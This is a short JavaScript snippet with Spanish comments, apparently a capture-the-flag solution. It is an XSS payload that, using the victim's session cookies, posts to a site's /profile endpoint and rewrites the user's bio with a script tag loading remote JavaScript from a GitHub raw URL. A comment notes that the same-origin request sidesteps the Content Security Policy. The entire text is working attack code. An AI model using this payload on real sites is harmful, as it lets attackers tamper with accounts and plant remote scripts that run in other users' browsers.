(function() {
  var form = new FormData();
    // Reemplaza '¡Biografía de Jeni comprometida!' por el texto del CTF
  form.append('bio', '<script src="https://raw.githubusercontent.com/notluken/vtf/refs/heads/main/z.js"></script>'); 
  form.append('profile_pic', new Blob([''], {type: 'application/octet-stream'}), '');

    // ¡La petición es al dominio local, evitando el CSP!
  fetch('/profile', { 
    method: 'POST',
    body: form,
    credentials: 'include'
  }).then(response => {
    console.log('XSS Exitoso: Biografía de Jeni cambiada.');
  }).catch(console.error);
})();
